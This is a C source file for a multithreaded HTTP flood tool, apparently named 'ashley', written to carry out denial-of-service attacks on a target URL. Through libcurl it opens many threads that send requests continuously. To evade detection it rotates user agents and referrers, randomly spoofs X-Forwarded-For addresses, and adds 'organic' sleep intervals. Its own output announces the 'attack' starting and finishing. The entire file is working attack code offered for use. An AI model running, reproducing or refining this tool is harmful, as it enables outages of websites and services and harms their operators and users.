// By Scav-engeR : @Ghiddra      
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <curl/curl.h>
#include <time.h>

#define MAX_THREADS 1000
#define MAX_USER_AGENTS 200

const char *target_url;
int threads;
int duration;

pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;

const char *user_agents[MAX_USER_AGENTS] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; rv:60.0) Gecko/20100101 Firefox/60.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; rv:65.0) Gecko/20100101 Firefox/65.0",
    "Mozilla/5.0 (Linux; Android 10; SM-A505U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    // Add more user agents up to 200...
};

const char *referrers[] = {
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.duckduckgo.com/",
    "https://www.ask.com/",
    "https://www.yandex.com/",
    // Add more referrers as needed
};

void *send_request(void *arg) {
    CURL *curl;
    CURLcode res;
    char user_agent[256];
    char referrer[256];
    char accept_language[256];
    char method[10];

    // Randomize user agent
    snprintf(user_agent, sizeof(user_agent), "%s", user_agents[rand() % (sizeof(user_agents) / sizeof(user_agents[0]))]);
    snprintf(referrer, sizeof(referrer), "%s", referrers[rand() % (sizeof(referrers) / sizeof(referrers[0]))]);
    snprintf(accept_language, sizeof(accept_language), "en-US,en;q=0.9");

    // Randomly choose between GET, POST, or HEAD methods
    const char *methods[] = {"GET", "POST", "HEAD"};
    snprintf(method, sizeof(method), "%s", methods[rand() % 3]);

    curl = curl_easy_init();
    if (curl) {
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, "Connection: keep-alive");
        headers = curl_slist_append(headers, "Upgrade-Insecure-Requests: 1");
        headers = curl_slist_append(headers, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8");
        headers = curl_slist_append(headers, "Accept-Encoding: gzip, deflate, br");
        headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.9");
        headers = curl_slist_append(headers, "Connection: close");

        // Randomized X-Forwarded-For header for more obfuscation
        char x_forwarded_for[50];
        snprintf(x_forwarded_for, sizeof(x_forwarded_for), "X-Forwarded-For: %d.%d.%d.%d", rand() % 255, rand() % 255, rand() % 255, rand() % 255);
        headers = curl_slist_append(headers, x_forwarded_for);

        curl_easy_setopt(curl, CURLOPT_URL, target_url);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, user_agent);
        curl_easy_setopt(curl, CURLOPT_REFERER, referrer);
        curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL); // Disable response body handling
        curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, 5000L); // Short timeout to keep connection alive



        if (strcmp(method, "POST") == 0) {
            curl_easy_setopt(curl, CURLOPT_POST, 1L);
        } else if (strcmp(method, "HEAD") == 0) {
            curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
        }

        // Debug: Output the URL being requested
        printf("Thread %ld: Sending %s request to %s\n", pthread_self(), method, target_url);

        // Continuous request sending until duration expires
        time_t start_time = time(NULL);
        while (time(NULL) - start_time < duration) {
            res = curl_easy_perform(curl);

            if (res != CURLE_OK) {
                // Debug: Log error
                fprintf(stderr, "Thread %ld: Error: %s\n", pthread_self(), curl_easy_strerror(res));
            } else {
                // Debug: Confirm request was sent
                printf("Thread %ld: Request successfully sent to %s\n", pthread_self(), target_url);
            }

            // Random sleep to simulate more organic behavior
            usleep((rand() % 500) + 200); // Sleep between 200-700 microseconds
        }

        // Clean up the curl handle
        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    }

    return NULL;
}

void show_help() {
    printf("Usage: ./ashley <target_url> <threads> <duration>\n");
    exit(1);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Error: Missing arguments.\n");
        show_help();
    }

    target_url = argv[1];
    threads = atoi(argv[2]);
    duration = atoi(argv[3]);

    if (threads <= 0 || duration <= 0) {
        printf("Error: Threads and duration must be positive integers.\n");
        show_help();
    }

    // Initialize cURL globally
    curl_global_init(CURL_GLOBAL_DEFAULT);

    pthread_t thread_pool[MAX_THREADS];
    int i;

    // Debug: Confirm starting the attack
    printf("Attack starting with %d threads for %d seconds...\n", threads, duration);

    // Create threads
    for (i = 0; i < threads; i++) {
        if (pthread_create(&thread_pool[i], NULL, send_request, NULL) != 0) {
            perror("Thread creation failed");
        }
    }

    // Debug: Confirm attack launched
    printf("Attack started: Sending requests...\n");

    // Wait for threads to finish
    for (i = 0; i < threads; i++) {
        pthread_join(thread_pool[i], NULL);
    }

    // Clean up cURL
    curl_global_cleanup();

    // Debug: Confirm end of attack
    printf("Attack finished.\n");

    return 0;
}
